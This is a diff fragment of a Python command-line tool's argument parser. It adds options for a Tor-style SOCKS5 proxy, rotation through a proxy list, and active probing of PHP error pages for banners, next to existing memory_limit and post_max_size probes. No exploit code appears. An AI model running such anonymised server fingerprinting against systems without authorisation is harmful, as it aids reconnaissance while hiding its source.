     ap.add_argument("--proxy", default=None,
-                    help="HTTP proxy (http://...)")
+                    help="single HTTP/SOCKS5 proxy (e.g. socks5://127.0.0.1:9050 or http://proxy:8080)")
+    ap.add_argument("--proxy-file", default=None,
+                    help="path to file containing list of proxies for rotation")
     ap.add_argument("--probe-memory", action="store_true",
                     help="allow the P2 memory_limit probe")
     ap.add_argument("--probe-post-max", action="store_true",
                     help="allow the P1 post_max_size probe")
+    ap.add_argument("--probe-error-page", action="store_true",
+                    help="actively probe non-existent PHP endpoint to capture error banners")
     ap.add_argument("-q", "--quiet", action="store_true",
                      help="quiet mode")
     args = ap.parse_args()
